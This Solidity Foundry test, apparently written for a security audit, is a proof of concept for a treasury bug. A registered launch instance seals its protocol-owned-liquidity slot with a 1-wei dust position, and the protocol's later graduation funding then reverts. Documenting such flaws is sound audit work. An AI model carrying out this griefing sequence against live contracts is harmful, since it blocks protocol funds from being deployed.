// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { ProtocolOwnedLiquidityV1 } from "../../../src/treasury/ProtocolOwnedLiquidityV1.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { PoolKey } from "v4-core/types/PoolKey.sol";
import { Currency } from "v4-core/types/Currency.sol";
import { IHooks } from "v4-core/interfaces/IHooks.sol";
import { MockERC20 } from "../../mocks/MockERC20.sol";
// solhint-disable max-line-length
import {
    MockMasterRegistry,
    MockPoolManagerV4
} from "../../treasury/ProtocolOwnedLiquidity.t.sol";

/// Claim: a T2 registered instance calls `receivePOL` for itself with a dust escrow BEFORE its
/// graduation, permanently sealing its POL slot: the protocol's graduation fee leg can never be
/// deployed into POL (`POLAlreadyDeployed` reverts the approved-deployer funding the module makes,
/// and the module wraps that call in no try/catch), so protocol-owned LP for that instance is
/// locked out until the owner intervenes.
contract TreasuryDustSealPOLSlotTest is Test {
    ProtocolOwnedLiquidityV1 pol;
    MockMasterRegistry registry;
    MockERC20 token;
    MockPoolManagerV4 pm;

    address owner = address(0x1);
    address instance = address(0x2); // a registered launch (T2) — the attacker
    address deployer = address(0x3); // the graduation venue's LiquidityDeployerModule singleton

    int24 constant TICK_LOWER = -887_220;
    int24 constant TICK_UPPER = 887_220;

    function setUp() public {
        ProtocolOwnedLiquidityV1 impl = new ProtocolOwnedLiquidityV1();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), abi.encodeWithSelector(ProtocolOwnedLiquidityV1.initialize.selector, owner)
        );
        pol = ProtocolOwnedLiquidityV1(payable(address(proxy)));

        registry = new MockMasterRegistry();
        token = new MockERC20("Mock", "MOCK");
        pm = new MockPoolManagerV4();

        vm.startPrank(owner);
        pol.setV4PoolManager(address(pm));
        pol.setWETH(address(0xBEEF));
        pol.setMasterRegistry(address(registry));
        pol.setApprovedDeployer(address(deployer));
        vm.stopPrank();

        registry.setRegistered(instance, true);
        token.mint(instance, 10 ether);
        token.mint(deployer, 100 ether);

        vm.deal(instance, 10 ether);
        vm.deal(deployer, 100 ether); // the protocol fee leg waiting to be deployed at graduation
    }

    function _poolKey() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(token)),
            fee: 3000,
            tickSpacing: int24(60),
            hooks: IHooks(address(0))
        });
    }

    function test_lateJoinDustSealsInstancePolSlotAgainstProtocolFunding() public {
        PoolKey memory key = _poolKey();

        // Attack (T2): the instance self-funds its POL slot with a 1-wei-per-leg dust position.
        vm.prank(instance);
        token.approve(address(pol), type(uint256).max);
        vm.prank(instance);
        pol.receivePOL{ value: 1 }(instance, key, TICK_LOWER, TICK_UPPER, 1, 1);

        (,,, uint128 dustLiq) = pol.getPolPosition(instance);
        assertGt(dustLiq, 0, "dust position must register");

        // Graduation: the module (approvedDeployer) brings the protocol fee leg — 1 ETH of
        // protocol-owned capital — to stand up real POL for this instance.
        vm.expectRevert(ProtocolOwnedLiquidityV1.POLAlreadyDeployed.selector);
        vm.prank(deployer);
        pol.receivePOL{ value: 1 ether }(instance, key, TICK_LOWER, TICK_UPPER, 1 ether, 1 ether);

        // Harm: the slot holds only the attacker's dust; the protocol's 1 ETH never entered POL, and
        // the position is not replaceable by any T2/T4 call — only an owner `withdrawPOL` frees it.
        (,,, uint128 liq) = pol.getPolPosition(instance);
        assertEq(liq, dustLiq, "protocol funding never landed");
        assertEq(deployer.balance, 100 ether, "fee leg never deployed");
    }
}
